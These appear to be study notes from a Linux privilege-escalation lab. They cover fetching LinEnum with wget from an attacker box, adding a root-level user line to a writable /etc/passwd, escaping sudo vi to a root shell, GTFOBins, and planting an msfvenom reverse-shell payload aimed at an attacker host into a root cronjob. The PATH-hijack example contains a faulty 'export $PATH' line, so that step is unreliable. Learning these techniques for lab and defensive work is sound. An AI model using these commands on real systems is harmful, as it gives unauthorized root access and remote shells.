# Enumeration

- use the LinEnum.sh script it gives good info.
- start a webserver with python where the file is present, `python -m http.server 80`
- go to the target box and use wget there, `wget <attacker-box>:80/LinEnum.sh`
- `cat /etc/shells` to list the number of available & valid shells on the box

## Write access to /etc/passwd
- before we add our user, first create a compliant password hash. use the command `openssl passwd -1 -salt [salt] [password]`. ex:- `openssl passwd -1 -salt new 123`
- Add a line as the following - `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`

## Abusing SUID/SGID files
- try and see if you can execute these files

## Escaping VI Editor
- always use `sudo -l` to know what commands the user can execute as a sudo user.
- therefore you will be able to run as root user without a root password 
- this can help you escalate your own privileges
- running this command as `user8` will show us that this user can run vi as root user.
- Type in `sudo vi` and type `:!sh` or `:!bash` to give you a root shell.


## Misconfigured Binaries or GTFOBins
- GTFOBins are curated list of binaries that can be exploited by an attacker to by pass local security restrictions
- For more info look at [GTFOBins](https://gtfobins.github.io)
- this is how we have managed to get a shell with a VI editor
- this can also help us get a reverse/bind shell as well
- If you are looking for windows binaries [LOLBAS](https://lolbas-project.github.io/)
- LOLBAS - Living of Land binaries and scripts

## Exploit cronjobs
- If you find any cronjob running as root, then you can get a root shell.
- First create the payload
- `msfvenom -p cmd/unix/reverse_tcp LHOST=<attacker-host> LPORT=<attacker-port>`
- copy that payload and edit the script & replace it with payload contents and therefore you become an admin

## Exploit PATH variable
- If you find a SGID file which is running as root and is picking some executables as part of the script, you can create a dummy executable in a specific path and export that path & re-run the executable.
- If we do that we will be getting as shell as the SUID user.
- Example:- `cd /tmp;echo "/bin/bash" > ls;export $PATH=/tmp:$PATH`
- Now, when SGID user executes ls, he will ideally be giving us a SHELL.
